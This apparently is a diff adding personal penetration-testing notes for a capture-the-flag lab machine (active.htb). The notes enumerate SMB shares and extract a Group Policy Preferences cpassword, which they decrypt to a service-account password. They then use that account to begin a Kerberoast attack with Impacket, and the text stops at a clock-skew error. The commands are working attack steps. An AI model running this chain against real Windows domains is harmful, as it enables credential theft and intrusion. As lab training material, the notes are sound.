@@ -1,0 +1,80 @@
+[SMB (445/tcp)]
+
+--------------------------- NMAP ---------------------------
+locate -r '\.nse$' | grep smb | xargs grep categories | grep 'safe\|default'
+nmap --script smb-enum-services 10.10.10.100
+|
+|___ERROR: Script execution failed (use -d to debug)
+
+nmap --script smb-enum-services 10.10.10.100 -d
+|
+|___Couldn't negotiate a SMBv1 connection:SMB: Failed to receive bytes: ERROR
+
+
+nmap --script safe 10.10.10.100
+|
+|___SMB2 ONLY (NO SMB1 Support)
+
+--------------------------- Metasploit ---------------------------
+use auxiliary/scanner/smb/smb2
+|
+|___Supports SMB 2 [dialect 255.2] and has been online for 22 hours
+
+--------------------------- SMBMAP ---------------------------
+smbmap -H 10.10.10.100
+|
+|_Open Shares:
+|_ADMIN$
+|_C$
+|_IPC$
+|_NETLOGON
+|_Replication [READ ONLY]
+|_SYSVOL
+|_Users
+
+smbmap -R Replication -H 10.10.10.100
+smbmap -R Replication -H 10.10.10.100 -A Groups.xml -q
+
+--------------------------- SMBCLIENT ---------------------------
+smbclient -L \\\\10.10.10.100\\
+|
+|___[!!!] Gets an SMB Prompt [READ ONLY]
+
+smbclient -L \\\\10.10.10.100\\Replication
+smb: \> cd active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\
+smb: \> get Groups.xml
+|
+|_userName="active.htb\SVC_TGS"
+|_cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"
+
+
+
+
+--------------------------- GPP Decryption ---------------------------
+gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
+|
+|___Result: GPPstillStandingStrong2k18
+
+--------------------------- BREAKING SMB ---------------------------
+smbclient \\\\10.10.10.100\\Users -U 'SVC_TGS'
+Password: GPPstillStandingStrong2k18
+
+
+
+[KERBEROS (88/tcp)]
+--------------------------- Kerberos with Kerberoast Attack ---------------------------
+1. Get SPN with Impacket
+sudo nano /etc/resolv.conf -> Add nameserver 10.10.10.100
+python3 GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18
+python3 GetUserSPNs.py -dc-ip 10.10.10.100 -request active.htb/SVC_TGS:GPPstillStandingStrong2k18
+|
+|___[ERROR]: KRB_AP_ERR_SKEW(Clock skew too great)
+    |
+    |___[SOLUTION]: Windows....
+
+
+
+
+
+
+
